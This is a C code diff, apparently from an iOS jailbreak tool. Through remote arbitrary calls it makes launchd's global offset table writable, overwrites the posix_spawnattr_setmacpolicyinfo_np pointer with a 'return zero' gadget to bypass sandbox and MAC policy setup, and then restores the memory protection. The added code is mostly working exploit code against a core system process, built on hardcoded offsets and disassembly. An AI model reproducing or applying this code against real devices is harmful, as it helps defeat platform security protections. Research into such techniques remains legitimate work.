@@ -293,6 +293,83 @@ vm_offset_t findSbinLaunchdOff(void) {
         }
         
         printf("Successfully overwrote launchd executable path string to %s\n", newPath);
+
+        // 1. Find  _posix_spawnattr_setmacpolicyinfo_np_ptr symbol ptr address(which is in __auth_got segment) that will be overwritten.
+        // Sorry, but it's hardcoded symbolptr address at that moment. because I'm lazy.
+
+        /*
+            ...
+            __got:000000010006CB10 _posix_spawnattr_setmacpolicyinfo_np_ptr DCQ __imp__posix_spawnattr_setmacpolicyinfo_np
+            __got:000000010006CB10                                         ; DATA XREF: _posix_spawnattr_setmacpolicyinfo_np↑o
+            __got:000000010006CB10                                         ; _posix_spawnattr_setmacpolicyinfo_np+4↑r
+            ...
+        */
+        vm_address_t _posix_spawnattr_setmacpolicyinfo_np_ptr_addr = launchd_base + 0x6CB10;
+
+        // 2. Call vm_protect that modifying map state to read-write for __auth_got segment.
+        // Sorry, but it's hardcoded map address at that moment. because I'm lazy.
+        // For arm64, it's NOT __auth_got, just __got
+
+        /*
+            __unwind_info:000000010006BFFD                 DCB    0
+            __unwind_info:000000010006BFFE                 DCB    0
+            __unwind_info:000000010006BFFF                 DCB    0
+            __unwind_info:000000010006BFFF ; __unwind_info ends
+            __unwind_info:000000010006BFFF
+            __got:000000010006C000 ; ===========================================================================
+            __got:000000010006C000
+            __got:000000010006C000 ; Segment type: Pure data
+            __got:000000010006C000                 AREA __got, DATA, READONLY, ALIGN=3
+            __got:000000010006C000                 ; ORG 0x10006C000
+            __got:000000010006C000 ; NDR_record_t *NDR_record_ptr
+            __got:000000010006C000 _NDR_record_ptr DCQ _NDR_record         ; DATA XREF: sub_100048D04+48↑r
+            __got:000000010006C000                                         ; sub_100048D64+64↑r ...
+            __got:000000010006C008 _SANDBOX_CHECK_NO_REPORT_ptr DCQ _SANDBOX_CHECK_NO_REPORT
+            __got:000000010006C008                                         ; DATA XREF: sub_10001A180+10↑r
+            ...
+        */
+
+        vm_address_t launchd_got = launchd_base + 0x6C000;
+        printf("reprotecting launchd@got as Read-Write: 0x%lx\n", launchd_got);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_got, 0x4000, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_protect failed\n");
+            return;
+        }
+
+        // 3. Find mov x0, #0; ret gadget or function address from dsc.
+        /*
+            __text:00000001000169B8 loc_1000169B8                           ; CODE XREF: __xpc_spawnattr_unpack_string+8↑j
+            __text:00000001000169B8                 MOV             X0, #0
+            __text:00000001000169BC                 RET
+        */
+        uint64_t launchd_mov_x0_0_gadget = launchd_base + 0x169B8;
+
+        // 4. If you find it, signing address due to PAC.
+        if(gIsPACSupported) {
+            //TO DO...
+        }
+
+        // 5. And overwrite signed address to '_posix_spawnattr_setmacpolicyinfo_np_ptr' symbol ptr address.
+        RemoteTaskHexDump(_posix_spawnattr_setmacpolicyinfo_np_ptr_addr, 0x100, launchd_task, (uint64_t)map);   //status: before;
+
+        RemoteTaskWrite64(_posix_spawnattr_setmacpolicyinfo_np_ptr_addr, launchd_task, map, launchd_mov_x0_0_gadget);
+
+        RemoteTaskHexDump(_posix_spawnattr_setmacpolicyinfo_np_ptr_addr, 0x100, launchd_task, (uint64_t)map);   //status: after; did it changed well?
+
+
+        // 6. Modify again, map state to read-only __auth_got(or __got) for restore.
+        printf("reprotecting launchd@got as Read only: 0x%lx\n", launchd_got);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_got, 0x4000, false, PROT_READ | VM_PROT_COPY);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_protect failed\n");
+            return;
+        }
+
+        // 7. Userspace reboot? (Beforehand put fastpathsigned launchd to path - /var/.launchd )
+
         RemoteArbCall(exit, 0);
         
         // stuff
